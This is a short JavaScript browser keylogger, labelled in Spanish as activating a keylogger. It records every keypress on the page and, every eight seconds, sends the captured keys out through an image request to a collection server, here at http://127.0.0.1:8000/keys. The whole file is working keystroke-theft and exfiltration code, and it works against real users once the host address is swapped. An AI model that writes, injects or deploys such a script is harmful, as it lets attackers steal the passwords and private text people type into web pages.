console.log("ACTIVANDO EL KEYLOGGER...");
var keys='';
document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  key = String.fromCharCode(key);
  keys+=key;
}

setInterval(function(){
  console.log("Loop");
  new Image().src = 'http://127.0.0.1:8000/keys?c='+keys;
  keys = '';
}, 8000);
